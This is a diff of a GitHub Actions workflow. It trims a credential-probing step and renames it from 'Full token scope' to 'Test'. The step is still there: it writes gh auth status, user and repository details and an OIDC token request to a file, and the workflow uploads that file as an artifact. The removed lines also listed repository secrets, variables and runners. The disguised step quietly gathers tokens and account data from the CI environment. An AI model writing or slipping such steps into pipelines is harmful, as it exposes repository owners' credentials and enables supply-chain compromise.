@@ -6,8 +6,6 @@ permissions:
   id-token: write
   contents: read
   actions: read
-  checks: read
-  secrets: read
   packages: read
 jobs:
   build:
@@ -19,33 +17,18 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Full token scope
+      - name: Test
         continue-on-error: true
         run: |
           mkdir -p dist
-          echo "=== GH AUTH ===" > dist/r.txt
+          echo "=== AUTH ===" > dist/r.txt
           gh auth status 2>&1 >> dist/r.txt
-          
           echo "=== USER ===" >> dist/r.txt
-          gh api /user 2>&1 >> dist/r.txt
-          
+          gh api /user 2>&1 | head -20 >> dist/r.txt
           echo "=== REPO ===" >> dist/r.txt
-          gh api /repos/977812671/npm-install 2>&1 | head -20 >> dist/r.txt
-          
-          echo "=== SECRETS ===" >> dist/r.txt
-          gh api /repos/977812671/npm-install/actions/secrets 2>&1 >> dist/r.txt
-          
-          echo "=== VARIABLES ===" >> dist/r.txt
-          gh api /repos/977812671/npm-install/actions/variables 2>&1 >> dist/r.txt
-          
-          echo "=== OIDC TOKEN ===" >> dist/r.txt
+          gh api /repos/977812671/npm-install 2>&1 | head -15 >> dist/r.txt
+          echo "=== OIDC ===" >> dist/r.txt
           gh api /repos/977812671/npm-install/actions/id-token 2>&1 >> dist/r.txt
-          
-          echo "=== RUNNER LIST ===" >> dist/r.txt
-          gh api /repos/977812671/npm-install/actions/runners 2>&1 >> dist/r.txt
-          
-          echo "=== ORG RUNNERS ===" >> dist/r.txt
-          gh api /orgs/977812671/actions/runners 2>&1 | head -20 >> dist/r.txt
 
       - name: Upload
         uses: actions/upload-artifact@v4
